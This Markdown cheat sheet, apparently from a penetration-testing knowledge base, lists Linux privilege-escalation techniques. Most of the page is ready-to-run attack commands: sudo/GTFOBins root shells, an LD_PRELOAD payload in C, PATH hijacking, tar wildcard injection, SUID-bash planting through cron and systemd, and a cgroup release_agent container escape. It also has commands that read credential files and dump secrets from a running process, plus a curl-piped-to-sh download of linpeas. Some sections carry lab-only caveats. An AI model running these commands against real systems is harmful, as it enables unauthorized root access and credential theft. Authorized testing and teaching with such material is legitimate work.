---
title: "Linux Privilege Escalation"
description: "SUID, capabilities, sudo, cron, kernel exploits, container escapes and more Linux privilege escalation techniques"
tags:
  - PrivEsc
  - Linux
  - SUID
  - GTFOBins
  - Containers
---

# Linux Privilege Escalation

!!! note "What this page is doing"
    Start with the current UID, groups, capabilities, mounts and writable paths. Validate deterministic permission mistakes before considering a kernel exploit, and use a harmless marker or a lab snapshot so the before/after context is clear.

---

## 1. Enumeration (Run These First)

```bash
# --- System & kernel ---
uname -a; cat /etc/os-release; hostnamectl
cat /proc/version; lsb_release -a 2>/dev/null
# --- Identity & context ---
id; whoami; groups; sudo -l; cat /etc/passwd; cat /etc/group
getent passwd | grep -E "sh$" # Users with shells
# --- Environment & history ---
env; cat ~/.bash_history 2>/dev/null; cat /etc/profile; cat ~/.bashrc
# --- Network & services ---
netstat -antup 2>/dev/null || ss -tulpn
ip a; ip route; cat /etc/hosts
ps aux --sort=-%cpu | head -20
# --- Mounts, cron & files of interest ---
mount; cat /etc/fstab; cat /etc/crontab; ls -la /etc/cron.*
find / -writable -type d 2>/dev/null | grep -vE "proc|sys|dev" | head -50
find / -perm -o+w -type f 2>/dev/null | grep -vE "proc|sys" | head -50
# --- Automated collectors ---
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a
./linux-exploit-suggester.sh
pspy64 -pf -i 1000 # Watch processes/cron without root (SUPER valuable)
# --- Also: linenum.sh, lse.sh (Linux Smart Enumeration), traitor, deepce, CDK ---
```

---

## 2. SUID / SGID & Capabilities

```bash
# Find SUID and SGID binaries. Review each result and its owner before use.
find / -xdev -perm -4000 -type f 2>/dev/null  # SUID
find / -xdev -perm -2000 -type f 2>/dev/null  # SGID
find / -xdev -perm -6000 -type f 2>/dev/null  # both bits

# Find file capabilities, then compare only interesting binaries with GTFOBins.
getcap -r / 2>/dev/null
sudo -l

# Lab-only examples when the exact binary is confirmed as a permitted path.
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
env /bin/sh -p

# An older Nmap build may expose an interactive mode; run the binary first.
nmap --interactive
```

The last command opens an interactive prompt only on versions that support it. Keep the prompt input separate from shell commands:

```text
# Example interactive input on an approved lab binary:
nmap> !sh
```

If `sudo -l` shows `env_keep+=LD_PRELOAD`, verify the exact permitted command before building a lab proof. Keep the C source, compiler command and execution command in separate blocks so the language and expected result are unambiguous:

```c
/* Lab proof: a constructor that records the effective UID change. */
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void proof(void) {
    setuid(0);
    setgid(0);
    system("/usr/bin/id > /tmp/authorized-lab-marker");
}
```

```bash
# Compile the lab proof as a position-independent shared object.
gcc -fPIC -shared -o /tmp/privilege-proof.so /tmp/privilege-proof.c

# Use LD_PRELOAD only with the exact command allowed by sudo and only in scope.
sudo -l
LD_PRELOAD=/tmp/privilege-proof.so /usr/bin/<PERMITTED_COMMAND>

# Inspect the marker, then remove both artifacts during cleanup.
cat /tmp/authorized-lab-marker
rm -f /tmp/authorized-lab-marker /tmp/privilege-proof.so
```

---

## 3. Sudo Abuse (GTFOBins)

```bash
sudo -l
# Common exploitable entries:
# (ALL) NOPASSWD: /usr/bin/vim -> sudo vim -c ':!/bin/bash'
# (ALL) NOPASSWD: /usr/bin/find -> sudo find / -exec /bin/sh \; -quit
# (ALL) NOPASSWD: /usr/bin/less /var/log/* -> sudo less /var/log/syslog then !sh
# (ALL) NOPASSWD: /usr/bin/tar -> sudo tar -cf /dev/null /dev/null --checkpoint=1 \
# --checkpoint-action=exec=/bin/sh
# (ALL) NOPASSWD: /usr/bin/awk -> sudo awk 'BEGIN {system("/bin/bash")}'
# (ALL) NOPASSWD: /usr/bin/env -> sudo env /bin/bash
# (ALL) NOPASSWD: /usr/bin/nmap -> sudo nmap --interactive -> !sh
# (ALL) NOPASSWD: /usr/bin/pip install -> sudo pip install --upgrade /tmp/evil (setup.py RCE)
# (ALL) NOPASSWD: /usr/bin/git -> see below
# --- LD_PRELOAD via sudo env_keep ---
sudo -l | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH"
# --- sudo via a hijacked script -----------------------------------------------------------------
# If sudo allows running a script that calls another binary WITHOUT a full path:
sudo -l # e.g. (ALL) NOPASSWD: /opt/scripts/backup.sh
cat /opt/scripts/backup.sh # calls: tar -czf /backup.tar.gz /home
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/tar && echo '/bin/bash' >> /tmp/tar && chmod +x /tmp/tar
sudo /opt/scripts/backup.sh # <- root shell via PATH hijack!
# --- sudoedit / sudo -e exploit ---
# If sudoedit is allowed with a wildcard and EDITOR is preserved:
EDITOR='vim --cmd ":!sh"' sudoedit /etc/hosts
# --- Sudo CVEs (check sudo -V!) ---
# CVE-2019-14287 : sudo -u#-1 /bin/bash (sudo < 1.8.28)
# CVE-2021-3156 : sudoedit -s '\' $(python -c 'print("A"*100)') (Baron Samedit)
# CVE-2023-22809 : sudoedit file with "X-EDITOR" env (sudo < 1.9.12p2)
```

---

## 4. Cron, Timers & Wildcards

```bash
# --- Enumerate every scheduled task ---
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all; find /etc/systemd -name "*.timer" -exec cat {} \;
./pspy64 -pf -i 1000 # Watch what runs (finds jobs you cannot read from config!)
# --- Writable cron script / binary (classic root shell) ---
# If a root cron runs /opt/cleanup.sh and YOU can write to it:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/cleanup.sh
/tmp/rootbash -p
# --- Wildcard injection (tar / rsync / chown / 7z) ---
# Cron: cd /var/www/html && tar -czf /backup/site.tar.gz *
echo 'echo "root:$1$xyz$..." >> /etc/passwd' > /var/www/html/--checkpoint=1
echo 'echo "pwn" > /root/flag' > '/var/www/html/--checkpoint-action=exec=sh shell.sh'
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /var/www/html/shell.sh
# rsync wildcard: create "-e sh shell.sh" as a filename
# --- systemd unit abuse ---
# If you can write a service unit or the ExecStart binary that root runs:
systemctl list-units --type=service --state=running
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null
# Create a unit manually and enable it if you can write to /etc/systemd/system:
cat > /etc/systemd/system/pwn.service << 'EOF'
[Unit]
Description=pwn
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now pwn.service
```

---

## 5. Credentials on the Box

```bash
# --- Hunt for secrets with an automated sweep ---
grep -rE "password|passwd|pwd|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH|DSA) PRIVATE" \
     /home /var/www /opt /srv /etc 2>/dev/null --include="*.conf" --include="*.env" \
     --include="*.yml" --include="*.yaml" --include="*.json" --include="*.txt" --include="*.ini" | head -100
# --- High-value files to read ---
cat /var/www/html/wp-config.php # WordPress DB creds
cat /var/www/html/.env # Laravel/Django/Node app secrets
cat ~/.git-credentials ~/.netrc ~/.my.cnf ~/.pgpass ~/.aws/credentials
cat /etc/nginx/nginx.conf /etc/apache2/sites-enabled/* -r
ls -la /var/backups/* /home/*/.ssh/* /root/.ssh/* 2>/dev/null
cat /etc/openvpn/*.conf /etc/wireguard/*.conf 2>/dev/null
# --- Database credential reuse ---
mysql -u root -p'found_password' -e 'SELECT user,authentication_string FROM mysql.user;'
# Then: UDF RCE or INTO OUTFILE webshell
# --- Memory & process secrets ---
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -i "pass\|token"
ps aux | grep -i "pass\|token" # mysql -pPass on the CLI!
# Dump credentials from a running process (needs gdb/ptrace ability):
gdb -p <PID> -batch -ex 'call (char*)getenv("PASSWORD")'
```

---

## 6. Container & Kubernetes Escapes

```bash
# --- Am I in a container? ---
ls -la /.dockerenv; cat /proc/1/cgroup | head; cat /proc/self/status | grep CapEff
capsh --print
# --- Docker socket exposed inside the container (game over) ---
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run --rm -v /:/host -it alpine chroot /host /bin/bash
# --- Privileged container escape (cap_sys_admin) ---
# Mount the host filesystem:
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash
# Or abuse cgroup release_agent:
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1)); mkdir -p $d/w; echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/cmd" > $d/release_agent
printf '#!/bin/sh\nchmod u+s /bin/bash' > /cmd && chmod +x /cmd
sh -c "echo \$\$ > $d/cgroup.procs"
# --- Service account token & K8s API access ---
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN auth can-i --list
# Apply a reviewed lab manifest only when the ROE explicitly includes a
# privileged-pod test. The manifest below reads a non-sensitive host marker.
kubectl --token="$TOKEN" apply -f privileged-pod.yaml

# --- Other escape vectors ---
# - nsenter with host PID namespace: nsenter -t 1 -m -u -i -n -p -- bash
# - /proc/sys/kernel/core_pattern abuse (privileged container)
# - Writable hostPath mount (e.g. /etc/ mounted into the container)
# - runc CVE-2024-21626 (Leaky Vessels) / CVE-2019-5736 (runc overwrite)
# - /dev/kmsg or /sys/fs/cgroup writes from a privileged container
```

```yaml
# privileged-pod.yaml — lab-only canary manifest.
apiVersion: v1
kind: Pod
metadata:
  name: approved-host-marker
spec:
  containers:
    - name: marker
      image: alpine
      command: ["/bin/sh", "-c", "cat /host/etc/hostname"]
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
```

Remove the pod and any generated evidence as soon as the approved validation is complete.

---

## 7. Kernel Exploits (Last Resort)

```bash
# 1. Identify the exact kernel version
uname -r; cat /proc/version
# 2. Automated suggestions — THE TOOL, but READ the output and prune false positives
./linux-exploit-suggester.sh -k $(uname -r)
./les.sh
# 3. Common historical LPEs (verify the target actually matches!)
uname -r # DirtyCow (2.6.22 - 4.8.3) CVE-2016-5195
                  # DirtyPipe (5.8 - 5.16.11) CVE-2022-0847
                  # PwnKit (pkexec, all versions) CVE-2021-4034
                  # Sudo Baron Samedit CVE-2021-3156
                  # Netfilter nf_tables (5.14-6.6) CVE-2024-1086
                  # OverlayFS (Ubuntu 20.04/22.04) CVE-2023-0386
                  # io_uring (5.10-6.6) CVE-2023-0461
# 4. Always test on a snapshot / low-value host first. Kernel exploits = crashes.
```

!!! tip "Order of Preference (Highest Reliability First)"
    1. **Credentials found on disk / config / history** (no exploit risk)
    2. **`sudo -l` misconfiguration** (GTFOBins / LD_PRELOAD)
    3. **SUID / SGID / capabilities** (deterministic)
    4. **Scheduled tasks & writable service files** (deterministic)
    5. **Group memberships** (docker, lxd, adm, disk, shadow)
    6. **Kernel exploit** — only after confirming an exact version match
